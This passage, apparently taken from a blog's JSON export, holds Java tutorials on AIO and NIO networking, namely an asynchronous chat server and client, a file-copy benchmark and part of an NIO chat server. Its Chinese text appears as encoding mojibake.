èµ„æºï¼Œåœ¨ä¸åŒçš„çº¿ç¨‹ä¸­å®Œæˆå¼‚æ­¥å¤„ç†ã€‚ 2. èŠå¤©å®¤åˆ†æ2.1 æœåŠ¡å™¨ç«¯2.1.1 å­—æ®µåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.2 ä¸»æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.3 AcceptHandleråœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.4 ClientHandlerï¼ˆå¤„ç†è¯»å†™è¯·æ±‚ï¼‰åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.5 æ·»åŠ å’Œåˆ é™¤ç”¨æˆ·åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.6 æ¥æ”¶å’Œè½¬å‘æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2 å®¢æˆ·ç«¯å®¢æˆ·ç«¯ä¸­ä½¿ç”¨çš„Futureæ¥å¤„ç†å¼‚æ­¥è¯·æ±‚ï¼Œéå¸¸ç®€å• 2.2.1 ä¸»æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2.2 å‘é€æ¶ˆæ¯åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2.3 ç”¨æˆ·çš„è¾“å…¥çº¿ç¨‹åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3. æµ‹è¯•ç»“æœ æœåŠ¡å™¨ç«¯æ˜¾ç¤º 4. å®Œæ•´ä»£ç 4.1 æœåŠ¡å™¨ç«¯package server; import java.io.Closeable; import java.io.IOException; import java.net.InetSocketAddress; import java.nio.ByteBuffer; import java.nio.channels.AsynchronousChannelGroup; import java.nio.channels.AsynchronousServerSocketChannel; import java.nio.channels.AsynchronousSocketChannel; import java.nio.channels.CompletionHandler; import java.nio.charset.Charset; import java.nio.charset.StandardCharsets; import java.util.ArrayList; import java.util.List; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class ChatServer { private static final String LOCALHOST = &quot;localhost&quot;; private static final int DEFAULT_PORT = 8888; private static final String QUIT = &quot;quit&quot;; private static final int BUFFER = 1024; private AsynchronousServerSocketChannel serverChannel; private AsynchronousChannelGroup asynchronousChannelGroup; private List&lt;ClientHandler&gt; connectedClients; private Charset charset = StandardCharsets.UTF_8; private int port; public ChatServer(int port) { this.port = port; connectedClients = new ArrayList&lt;&gt;(); } public ChatServer() { this(DEFAULT_PORT); } public void start(){ try { //è‡ªå®šä¹‰ChannelGroup ExecutorService executorService = Executors.newFixedThreadPool(10); asynchronousChannelGroup = AsynchronousChannelGroup.withThreadPool(executorService); serverChannel = AsynchronousServerSocketChannel.open(asynchronousChannelGroup); serverChannel.bind(new InetSocketAddress(LOCALHOST,port)); System.out.println(&quot;æœåŠ¡å™¨å·²ç»å¯åŠ¨æˆåŠŸï¼Œéšæ—¶ç­‰å¾…å®¢æˆ·ç«¯è¿æ¥...&quot;); while (true){ serverChannel.accept(null,new AcceptHandler()); System.in.read(); } } catch (IOException e) { e.printStackTrace(); }finally { close(serverChannel); } } private class AcceptHandler implements CompletionHandler&lt;AsynchronousSocketChannel,Object&gt; { @Override public void completed(AsynchronousSocketChannel clientChannel, Object attachment) { if(serverChannel.isOpen()) serverChannel.accept(null,this); if(clientChannel != null &amp;&amp; clientChannel.isOpen()){ ClientHandler clientHandler = new ClientHandler(clientChannel); ByteBuffer buffer = ByteBuffer.allocate(BUFFER); addClient(clientHandler); clientChannel.read(buffer,buffer,clientHandler); } } @Override public void failed(Throwable exc, Object attachment) { System.out.println(&quot;è¿æ¥å¤±è´¥ï¼š&quot; + exc.getMessage()); } } private class ClientHandler implements CompletionHandler&lt;Integer,ByteBuffer&gt;{ private AsynchronousSocketChannel clientChannel; public ClientHandler(AsynchronousSocketChannel clientChannel) { this.clientChannel = clientChannel; } public AsynchronousSocketChannel getClientChannel() { return clientChannel; } @Override public void completed(Integer result, ByteBuffer buffer) { if(buffer != null){ //bufferä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œè¿™è¦æ‰§è¡Œçš„æ˜¯readä¹‹åçš„å›è°ƒæ–¹æ³• if(result &lt;= 0){ //å®¢æˆ·ç«¯å¼‚å¸¸ï¼Œå°†å®¢æˆ·ç«¯ä»è¿æ¥åˆ—è¡¨ä¸­ç§»é™¤ removeClient(this); }else{ buffer.flip(); String fwdMsg = receive(buffer); System.out.println(getClientName(clientChannel) + fwdMsg); forwardMsg(clientChannel,fwdMsg); buffer.clear(); if(readyToQuit(fwdMsg)){ removeClient(this); }else { clientChannel.read(buffer,buffer,this); } } } } @Override public void failed(Throwable exc, ByteBuffer attachment) { System.out.println(&quot;è¯»å†™æ“ä½œå¤±è´¥ï¼š&quot; + exc.getMessage()); } } private synchronized void addClient(ClientHandler clientHandler) { connectedClients.add(clientHandler); System.out.println(getClientName(clientHandler.getClientChannel()) + &quot;å·²ç»è¿æ¥&quot;); } private synchronized void removeClient(ClientHandler clientHandler) { AsynchronousSocketChannel clientChannel = clientHandler.getClientChannel(); connectedClients.remove(clientHandler); System.out.println(getClientName(clientChannel) + &quot;å·²ç»æ–­å¼€è¿æ¥&quot;); close(clientChannel); } private void close(Closeable closeable){ try { closeable.close(); } catch (IOException e) { e.printStackTrace(); } } private boolean readyToQuit(String msg){ return QUIT.equals(msg); } private synchronized String receive(ByteBuffer buffer) { return String.valueOf(charset.decode(buffer)); } private synchronized void forwardMsg(AsynchronousSocketChannel clientChannel,String fwdMsg) { for (ClientHandler connectedHandler : connectedClients) { AsynchronousSocketChannel client = connectedHandler.getClientChannel(); if(!client.equals(clientChannel)){ //æ³¨æ„è¿™ä¸ªtryï¼Œcatchæ˜¯è‡ªå·±åŠ çš„ try { //å°†æ¶ˆæ¯å­˜å…¥ç¼“å­˜åŒºä¸­ ByteBuffer buffer = charset.encode(getClientName(client) + fwdMsg); //å†™ç»™æ¯ä¸ªå®¢æˆ·ç«¯ client.write(buffer,null,connectedHandler); } catch (Exception e) { e.printStackTrace(); } } } } private String getClientName(AsynchronousSocketChannel clientChannel) { int port = -1; try { InetSocketAddress remoteAddress = (InetSocketAddress) clientChannel.getRemoteAddress(); port = remoteAddress.getPort(); } catch (IOException e) { e.printStackTrace(); } return &quot;å®¢æˆ·ç«¯[&quot; + port + &quot;]:&quot;; } public static void main(String[] args) { ChatServer chatServer = new ChatServer(); chatServer.start(); } } 4.2 å®¢æˆ·ç«¯package client; import java.io.Closeable; import java.io.IOException; import java.net.InetSocketAddress; import java.nio.ByteBuffer; import java.nio.channels.AsynchronousSocketChannel; import java.nio.charset.Charset; import java.nio.charset.StandardCharsets; import java.util.concurrent.ExecutionException; import java.util.concurrent.Future; public class ChatClient { private static final String LOCALHOST = &quot;localhost&quot;; private static final int DEFAULT_PORT = 8888; private final String QUIT = &quot;quit&quot;; private final int BUFFER = 1024; private String host; private int port; private AsynchronousSocketChannel clientChannel; private Charset charset = StandardCharsets.UTF_8; public ChatClient() { this(LOCALHOST,DEFAULT_PORT); } public ChatClient(String host,int port){ this.host = host; this.port = port; } public void start(){ try { clientChannel = AsynchronousSocketChannel.open(); Future&lt;Void&gt; connect = clientChannel.connect(new InetSocketAddress(host, port)); connect.get(); System.out.println(&quot;ä¸æœåŠ¡å·²æˆåŠŸå»ºç«‹è¿æ¥&quot;); new Thread(new UserInputHandler(this)).start(); ByteBuffer buffer = ByteBuffer.allocate(BUFFER); while (clientChannel.isOpen()){ Future&lt;Integer&gt; read = clientChannel.read(buffer); int result = read.get(); if(result &lt;= 0){ //è¿™é‡Œæ˜¯ï¼Œå½“æˆ‘ä»¬è¾“å…¥quitæ—¶ï¼Œåœ¨æœåŠ¡å™¨ç«¯ä¼šè‡ªåŠ¨å°†æˆ‘ä»¬ç§»é™¤ //æ‰€ä»¥è¿™é‡Œå…³é—­å°±å¥½äº† close(clientChannel); }else { buffer.flip(); String msg = String.valueOf(charset.decode(buffer)); System.out.println(msg); buffer.clear(); } } } catch (IOException | InterruptedException | ExecutionException e) { e.printStackTrace(); }finally { close(clientChannel); } } public void sendMsg(String msg){ if(msg.isEmpty()){ return; }else { ByteBuffer buffer = charset.encode(msg); Future&lt;Integer&gt; write = clientChannel.write(buffer); try { write.get(); } catch (InterruptedException | ExecutionException e) { e.printStackTrace(); } } } private void close(Closeable closeable){ try { closeable.close(); } catch (IOException e) { e.printStackTrace(); } } public boolean readyToQuit(String msg){ return QUIT.equals(msg); } public static void main(String[] args) { ChatClient chatClient = new ChatClient(); chatClient.start(); } } package client; import java.io.BufferedReader; import java.io.IOException; import java.io.InputStreamReader; public class UserInputHandler implements Runnable{ private ChatClient client; public UserInputHandler(ChatClient client) { this.client = client; } @Override public void run() { BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in)); while (true){ try { String msg = consoleReader.readLine(); client.sendMsg(msg); if(client.readyToQuit(msg)){ System.out.println(&quot;æˆåŠŸé€€å‡ºèŠå¤©å®¤&quot;); break; } } catch (IOException e) { e.printStackTrace(); } } } } æ€»ç»“1. ä¸‰ç§æ¨¡å‹çš„é€‚ç”¨åœºæ™¯ BIOï¼šé€‚ç”¨äºè¿æ¥æ•°ç›®å°‘ï¼Œè€Œä¸”æœåŠ¡å™¨èµ„æºå¯¹äºæˆ‘ä»¬å·²çŸ¥çš„è¿æ¥æ¥è¯´ï¼Œæ¯”è¾ƒå……è¶³ï¼Œå¼€å‘ç®€å• NIOï¼šç›¸å¯¹BIOæ¥è¯´ï¼Œå¼€å‘éš¾åº¦è¾ƒé«˜ï¼Œä½†æ˜¯å®¢æˆ·è¿æ¥æ•°ç›®æ¯”è¾ƒé«˜ã€‚å€¼å¾—æˆ‘ä»¬æ³¨æ„çš„æ˜¯ï¼Œç”±äºNIOæ˜¯å•ä¸€çš„çº¿ç¨‹è½®è¯¢æ¥å¤„ç†æ•°æ®ï¼Œéœ€è¦é¿å…æ¯ä¸ªä»»åŠ¡æ‰§è¡Œçš„æ—¶é—´è¿‡é•¿ï¼Œé˜²æ­¢å…¶ä»–çº¿ç¨‹å‡ºç°è¿‡é•¿çš„ç­‰å¾… AIOï¼šæ¥å—çš„è¿æ¥æ•°ç›®å¤šï¼Œç›¸å¯¹äºNIOæ¥è¯´ï¼Œæ˜¯å¼‚æ­¥å‡ºæ¥ï¼Œå¯ä»¥æ¥å—æŸä¸ªä»»åŠ¡èŠ±è´¹è¿‡é•¿çš„æ—¶é—´ï¼Œä½†æ˜¯å¼€å‘éš¾åº¦æ¯”è¾ƒé«˜ï¼Œç»´æŠ¤èµ·æ¥ä¹Ÿä¸ç®€å•ã€‚ é™„ï¼šå¯ä»¥ä½¿ç”¨JDKæ–‡ä»¶å¤¹ä¸‹é¢çš„VisualVMæ¥ç›‘æ§ç¨‹åºçš„ä½¿ç”¨æƒ…å†µ","categories":[],"tags":[{"name":"network","slug":"network","permalink":"https://blog.kayleh.top/tags/network/"}]},{"title":"NIO blocking model","slug":"NIOæ¨¡å‹","date":"2020-12-04T19:33:46.000Z","updated":"2021-04-11T17:11:28.330Z","comments":true,"path":"NIOæ¨¡å‹/","link":"","permalink":"https://blog.kayleh.top/NIO%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"NIOæ¨¡å‹1. æ¦‚è¿°1.1 ç¿»è¯‘ç¿»è¯‘ï¼Ÿä»€ä¹ˆå«NIOï¼ŸNIOï¼šæˆ‘è®¤ä¸ºç¿»è¯‘æˆNon-Blockingï¼Œæ›´åŠ çš„é€šä¿—ç›´ç™½ï¼Œç›¸æ¯”äºBIOï¼Œä¹Ÿæœ‰ä¸€ä¸ªå¯¹æ¯”ï¼Œå«ä»–éé˜»å¡IOæœ€å¥½ä¸è¿‡äº† å®ƒå’ŒBIOæœ‰ä»¥ä¸‹çš„åŒºåˆ« Channelæ˜¯åŒå‘çš„ï¼Œå³å¯ä»¥è¯»åˆå¯ä»¥å†™ï¼Œç›¸æ¯”äºStreamï¼Œå®ƒå¹¶ä¸åŒºåˆ†å‡ºè¾“å…¥æµå’Œè¾“å‡ºæµï¼Œè€Œä¸”Channelå¯ä»¥å®Œæˆéé˜»å¡çš„è¯»å†™ï¼Œä¹Ÿå¯ä»¥å®Œæˆé˜»å¡çš„è¯»å†™ 1.2 Bufferç®€ä»‹åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° Channelçš„è¯»å†™æ˜¯ç¦»ä¸å¼€Bufferçš„ï¼ŒBufferå®é™…ä¸Šå†…å­˜ä¸Šä¸€å—ç”¨æ¥è¯»å†™çš„åŒºåŸŸã€‚ 1.2.1 å†™æ¨¡å¼åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å…¶ä¸­ä¸‰ä¸ªæŒ‡é’ˆæˆ‘ä»¬è¦äº†è§£ä¸€ä¸‹ï¼Œpositionä¸ºå½“å‰æŒ‡é’ˆä½ç½®ï¼Œlimitç”¨äºè¯»æ¨¡å¼ï¼Œç”¨å®ƒæ¥æ ‡è®°å¯è¯»çš„æœ€å¤§èŒƒå›´ï¼Œcapacityæ˜¯æœ€å¤§çš„å¯å†™èŒƒå›´é˜ˆå€¼ åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å½“æˆ‘ä»¬å†™æ•°æ®å†™äº†å››ä¸ªæ ¼å­æ—¶ï¼Œæˆ‘ä»¬æ‰§è¡Œflip()æ–¹æ³•ï¼Œå³å¯è½¬å˜ä¸ºè¯»æ¨¡å¼ï¼ŒlimitæŒ‡é’ˆå°±ç›´æ¥å˜åˆ°äº†æˆ‘ä»¬åˆšåˆšå†™æ•°æ®çš„æé™ä½ç½®ï¼ŒpositionæŒ‡é’ˆå›åˆ°åˆå§‹ä½ç½®ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†æ•°æ®è¯»å‡ºæ¥äº† 1.2.2 è¯»æ¨¡å¼åˆ°å†™æ¨¡å¼çš„ä¸¤ç§åˆ‡æ¢åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å½“æˆ‘ä»¬å°†æ•°æ®å…¨éƒ¨è¯»å®Œæ—¶ï¼Œåˆ‡æ¢åˆ°å†™æ¨¡å¼è°ƒç”¨clear()æ–¹æ³•ï¼Œå®ƒä¼šä½¿positionæŒ‡é’ˆå›åˆ°åˆå§‹ä½ç½®ï¼Œlimitå›åˆ°æœ€è¿œç«¯ï¼Œè¿™æ ·å°±å¯ä»¥é‡æ–°å¼€å§‹æ•°æ®äº†ï¼Œè™½ç„¶clearæ„ä¸ºæ¸…é™¤ï¼Œä½†æ˜¯å…¶å®å®ƒåªæ˜¯å°†æŒ‡é’ˆçš„ä½ç½®ç§»åŠ¨äº†ï¼Œå¹¶æ²¡æœ‰å°†æ•°æ®æ¸…é™¤ï¼Œè€Œæ˜¯ä¼šè¦†ç›–åŸæ¥çš„ä½ç½® åªè¯»äº†éƒ¨åˆ†æ•°æ®ï¼Œæˆ‘æƒ³å°†æœªè¯»çš„éƒ¨åˆ†ä¿ç•™ï¼Œè€Œç°åœ¨æˆ‘åˆè¦å¼€å§‹å…ˆè¿›è¡Œå†™æ¨¡å¼çš„æ“ä½œäº†ï¼Œè¿™æ ·å¯ä»¥æ‰§è¡Œcompact()æ–¹æ³•è¿™ä¸ªæ–¹æ³•ä¼šå°†æ²¡æœ‰è¯»åˆ°çš„æ•°æ®ä¿å­˜åˆ°åˆå§‹ä½ç½®ï¼Œè€ŒpositionæŒ‡é’ˆçš„ä½ç½®å°†ä¼šç§»åŠ¨åˆ°è¿™äº›æ•°æ®çš„åé¢ä½ç½®ï¼Œä»æœªè¯»çš„æ•°æ®åå¼€å§‹è¿›è¡Œå†™æ•°æ®ä¹‹åå†è¯»æ•°æ®çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±èƒ½å°†ä¸Šæ¬¡æ²¡æœ‰è¯»åˆ°çš„æ•°æ®è¯»å‡ºæ¥äº† 1.3 Channelç®€ä»‹Channelé—´çš„æ•°æ®äº¤æ¢ï¼Œéƒ½éœ€è¦ä¾èµ–Buffer 1.3.1 å‡ ä¸ªé‡è¦çš„Channelåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° FileChannelï¼šç”¨äºæ–‡ä»¶ä¼ è¾“ ServerSocketChannelå’ŒSocketChannelï¼šç”¨äºç½‘ç»œç¼–ç¨‹çš„ä¼ è¾“ 2. æ–‡ä»¶æ‹·è´å®æˆ˜ ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„æ‹·è´å®åœ¨æ˜¯æ…¢çš„ä¸è¡Œã€‚ import java.io.*; import java.nio.ByteBuffer; import java.nio.channels.FileChannel; interface FileCopyRunner{ void copyFile(File source,File target); } public class FileCopyDemo { private static void close(Closeable closeable){ if(closeable != null) { try { closeable.close(); } catch (IOException e) { e.printStackTrace(); } } } //ä¸ä½¿ç”¨ä»»ä½•ç¼“å†²çš„ç•™çš„æ‹·è´ private static FileCopyRunner noBufferStreamCopy = new FileCopyRunner() { @Override public void copyFile(File source, File target) { InputStream fin = null; OutputStream fout = null; try { fin = new FileInputStream(source); fout = new FileOutputStream(target); int result; while((result = fin.read()) != - 1){ fout.write(result); } } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }finally { close(fin); close(fout); } } }; //ä½¿ç”¨ç¼“å†²åŒºçš„æµçš„æ‹·è´ private static FileCopyRunner bufferStreamCopy = new FileCopyRunner() { @Override public void copyFile(File source, File target) { InputStream fin = null; OutputStream fout = null; try { fin = new FileInputStream(source); fout = new FileOutputStream(target); //åˆ›å»ºç¼“å†²åŒº byte[] buffer = new byte[1024]; int result; while((result = fin.read(buffer)) != -1){ //resultè¿™é‡Œè¡¨ç¤ºä»ä¸­è¯»å‡ºæ¥çš„å…·ä½“å­—èŠ‚æ•° //è™½ç„¶ç¼“å†²åŒºä¸­èƒ½ç¼“å­˜1024ï¼Œä½†æ˜¯æˆ‘ä»¬è¯»å–çš„æ—¶å€™ä¸ä¸€å®šå°±æœ‰è¿™ä¹ˆå¤šå­—èŠ‚ //æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨resultåšä¸‹é¢çš„å‚æ•° fout.write(buffer,0,result); } } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }finally { close(fin); close(fout); } } }; //ä½¿ç”¨å¸¦æœ‰ç¼“å†²åŒºçš„channelå¤åˆ¶ nio private static FileCopyRunner nioBufferCopy = new FileCopyRunner() { @Override public void copyFile(File source, File target) { FileChannel fin = null; FileChannel fout = null; try { fin = new FileInputStream(source).getChannel(); fout = new FileOutputStream(target).getChannel(); ByteBuffer byteBuffer = ByteBuffer.allocate(1024); while(fin.read(byteBuffer) != -1){ byteBuffer.flip();//è½¬å˜ä¸ºè¯»æ¨¡å¼ while (byteBuffer.hasRemaining()){ fout.write(byteBuffer); } byteBuffer.clear();//è½¬å˜ä¸ºå†™æ¨¡å¼ } } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }finally { close(fin); close(fout); } } }; //ä½¿ç”¨æ²¡æœ‰ç¼“å†²åŒºçš„channelå¤åˆ¶æ–‡ä»¶ private static FileCopyRunner nioTransferCopy = ((source, target) -&gt; { FileChannel fin = null; FileChannel fout = null; try { fin = new FileInputStream(source).getChannel(); fout = new FileOutputStream(target).getChannel(); long transferred = 0L; long size = fin.size(); while(transferred != size){ //å¦‚æœæ‹·è´çš„å¤§å°æ²¡æœ‰è¾¾åˆ°æºæ–‡ä»¶çš„å¤§å°å°±è¦ä¸€ç›´æ‹·è´ transferred += fin.transferTo(0,size,fout); } } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); }finally { close(fin); close(fout); } }); public static void main(String[] args) { File source = new File(&quot;J:\\\\StudySpace\\\\Javaç§’æ€ç³»ç»Ÿæ–¹æ¡ˆä¼˜åŒ–-é«˜æ€§èƒ½é«˜å¹¶å‘å®æˆ˜\\\\project.zip&quot;); File target = new File(&quot;J:\\\\StudySpace\\\\Javaç§’æ€ç³»ç»Ÿæ–¹æ¡ˆä¼˜åŒ–-é«˜æ€§èƒ½é«˜å¹¶å‘å®æˆ˜\\\\p1.zip&quot;); File target2 = new File(&quot;J:\\\\StudySpace\\\\Javaç§’æ€ç³»ç»Ÿæ–¹æ¡ˆä¼˜åŒ–-é«˜æ€§èƒ½é«˜å¹¶å‘å®æˆ˜\\\\p2.zip&quot;); File target3 = new File(&quot;J:\\\\StudySpace\\\\Javaç§’æ€ç³»ç»Ÿæ–¹æ¡ˆä¼˜åŒ–-é«˜æ€§èƒ½é«˜å¹¶å‘å®æˆ˜\\\\p3.zip&quot;); File target4 = new File(&quot;J:\\\\StudySpace\\\\Javaç§’æ€ç³»ç»Ÿæ–¹æ¡ˆä¼˜åŒ–-é«˜æ€§èƒ½é«˜å¹¶å‘å®æˆ˜\\\\p4.zip&quot;); new Thread(() -&gt; noBufferStreamCopy.copyFile(source,target)).start(); new Thread(() -&gt; bufferStreamCopy.copyFile(source,target2)).start(); new Thread(() -&gt; nioBufferCopy.copyFile(source,target3)).start(); new Thread(() -&gt; nioTransferCopy.copyFile(source,target4)).start(); } } 3. Selectoræ¦‚è¿° Channeléœ€è¦åœ¨Selectorä¸Šæ³¨å†Œ æ³¨å†Œçš„åŒæ—¶ï¼Œè¦å‘Šè¯‰Selectorç›‘å¬çš„çŠ¶æ€ Channelå¯¹åº”çš„çŠ¶æ€æœ‰ï¼šCONNECTï¼šsocketChannelå·²ç»ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥çš„çŠ¶æ€ï¼›ACCEPTï¼šserverSocketChannelå·²ç»ä¸å®¢æˆ·ç«¯å»ºç«‹è¿æ¥çš„çŠ¶æ€ï¼›READï¼šå¯è¯»çŠ¶æ€ï¼›WRITEï¼šå¯å†™çŠ¶æ€ Channelåœ¨Selectorä¸Šæ³¨å†Œå®Œæˆåï¼Œä¼šè¿”å›ä¸€ä¸ªSelectKeyå¯¹è±¡ï¼Œå…¶ä¸­æœ‰å‡ ä¸ªé‡è¦çš„æ–¹æ³•ï¼šinterestOpsï¼šæŸ¥çœ‹æ³¨å†Œçš„Channelç»‘å®šçš„çŠ¶æ€ï¼›readyOpsï¼šæŸ¥çœ‹å“ªäº›æ˜¯å¯æ“ä½œçš„çŠ¶æ€ï¼›channelï¼šè¿”å›channelå¯¹è±¡ï¼›selectorï¼šè¿”å›selectorå¯¹è±¡ï¼›attachmentï¼šé™„åŠ å…¶ä»–å¯¹è±¡ è°ƒç”¨Selectorçš„selectæ–¹æ³•ï¼Œè¿”å›å®ƒç›‘å¬çš„äº‹ä»¶çš„æ•°é‡ï¼Œå¯åŒæ—¶å“åº”å¤šä¸ªäº‹ä»¶ã€‚ä¸è¿‡å®ƒæ˜¯é˜»å¡å¼çš„è°ƒç”¨ï¼Œå½“ç›‘å¬çš„äº‹ä»¶ä¸­æ²¡æœ‰å¯ä»¥ç”¨æ¥å“åº”è¯·æ±‚çš„ï¼Œåˆ™ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°æœ‰å¯ç”¨çš„channelèƒ½å¤Ÿå“åº”è¯¥è¯·æ±‚ï¼Œæ‰ä¼šè¿”å› å®æˆ˜1. NIOæ¨¡å‹åˆ†æåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åœ¨æœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ªSelectorï¼Œå°†ServerSocketChannelæ³¨å†Œåˆ°Selectorä¸Šï¼Œè¢«Selectorç›‘å¬çš„äº‹ä»¶ä¸ºAccept åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° Client1è¯·æ±‚ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼ŒSelectoræ¥æ”¶åˆ°Acceptäº‹ä»¶ï¼ŒæœåŠ¡å™¨ç«¯å¯¹å…¶è¿›è¡Œå¤„ç†ï¼ˆhandlesï¼‰ï¼ŒæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯è¿æ¥æˆåŠŸ åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° å»ºç«‹è¿æ¥è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨é€šé“ï¼ˆServerSocketChannelï¼‰è°ƒç”¨acceptæ–¹æ³•ï¼Œè·å–åˆ°ä¸å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥çš„é€šé“ï¼ˆSocketChannelï¼‰ï¼Œä¹Ÿå°†å…¶æ³¨å†Œåˆ°Selectorä¸Šï¼Œç›‘å¬READäº‹ä»¶ï¼Œè¿™æ ·ï¼Œå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯ï¼Œå°±èƒ½è§¦å‘è¯¥READäº‹ä»¶è¿›è¡Œå“åº”ï¼Œè¯»å–è¯¥æ¶ˆæ¯ã€‚ Tips: æˆ‘ä»¬å¤„ç†è¿™ä¸ªå»ºç«‹è¿æ¥å¹¶æ¥æ”¶ä»å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„æ¶ˆæ¯ï¼Œéƒ½æ˜¯åœ¨ä¸€ä¸ªçº¿ç¨‹å†…å®Œæˆçš„ã€‚åœ¨bioä¸­ï¼Œåˆ™ä¼šä¸ºå•ä¸ªå®¢æˆ·ç«¯å•ç‹¬å¼€è¾Ÿä¸€ä¸ªçº¿ç¨‹ï¼Œç”¨äºå¤„ç†æ¶ˆæ¯ï¼Œå¹¶ä¸”å®¢æˆ·ç«¯åœ¨ä¸å‘é€æ¶ˆæ¯çš„è¿‡ç¨‹ä¸­ï¼Œè¯¥çº¿ç¨‹ä¸€ç›´æ˜¯é˜»å¡çš„ã€‚ åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° åŒæ ·ï¼Œä¸¤ä¸ªå®¢æˆ·è¿æ¥è¿‡æ¥ä¹Ÿæ˜¯ä¸€ä¸ªçº¿ç¨‹åœ¨èµ·ä½œç”¨ï¼Œå°†å®¢æˆ·ç«¯2çš„SocketChannelæ³¨å†Œåˆ°æœåŠ¡å™¨çš„Selectorï¼Œå¹¶ç›‘å¬READäº‹ä»¶ï¼Œéšæ—¶å“åº”éšæ—¶å¤„ç†ã€‚å³ä¸€ä¸ªå®¢æˆ·ç«¯æœ‰ä¸€ä¸ªSocketChannelï¼Œä¸¤ä¸ªå®¢æˆ·ç«¯å°±æœ‰ä¸¤ä¸ªSocketChannelï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬ä½¿ç”¨nioç¼–ç¨‹æ¨¡å‹æ¥ç”¨ä¸€ä¸ªselectorå¯¹è±¡åœ¨ä¸€ä¸ªçº¿ç¨‹é‡Œè¾¹ç›‘å¬ä»¥åŠå¤„ç†å¤šä¸ªé€šé“çš„ioçš„æ“ä½œ å„ä¸ªChannelæ˜¯è¢«é…ç½®ä¸ºéé˜»å¡å¼çš„ï¼ˆconfigureBlocking(false)ï¼‰ï¼Œä½†æ˜¯Selectoræœ¬èº«è°ƒç”¨çš„select()æ–¹æ³•ï¼Œå®ƒæ˜¯é˜»å¡å¼çš„ï¼Œå½“ç›‘å¬åœ¨Selectorä¸Šçš„äº‹ä»¶éƒ½æ²¡æœ‰è§¦å‘æ—¶ï¼Œé‚£ä¹ˆå®ƒå°±ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°æœ‰äº‹ä»¶å¯¹å…¶è¿›è¡Œå“åº” 2. èŠå¤©å®¤é¡¹ç›®ä»£ç é‡ç‚¹çŸ¥è¯†2.1 æœåŠ¡å™¨ç«¯2.1.1 å­—æ®µåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.2 ä¸»æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.3 å¤„ç†æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.4 è½¬å‘æ¶ˆæ¯æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.1.5 æ¥æ”¶æ¶ˆæ¯æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2 å®¢æˆ·ç«¯2.2.1 å­—æ®µåœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2.2 ä¸»æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2.3 å¤„ç†æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2.4 æ¥æ”¶æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 2.2.5 å‘é€æ–¹æ³•åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿° 3. æµ‹è¯•ç»“æœ æœåŠ¡å™¨ç«¯æ˜¾ç¤ºä¿¡æ¯æ­£ç¡® 4. å®Œæ•´ä»£ç 4.1 æœåŠ¡å™¨ç«¯package server; import java.io.Closeable; import java.io.IOException; import java.net.InetSocketAddress; import java.nio.ByteBuffer; import java.nio.channels.*; import java.nio.charset.Charset; import java.nio.charset.StandardCharsets; import java.util.Set; public class ChatServer { private static final int DEFAULT_PORT = 8888; private static final String QUIT = &quot;quit&quot;; private static final int BUFFER = 1024; private int port; private ServerSocketChannel serverSocketChannel; private Selector selector; private ByteBuffer rBuffer = ByteBuffer.allocate(BUFFER); private ByteBuffer wBuffer = ByteBuffer.allocate(BUFFER); private Charset charset = 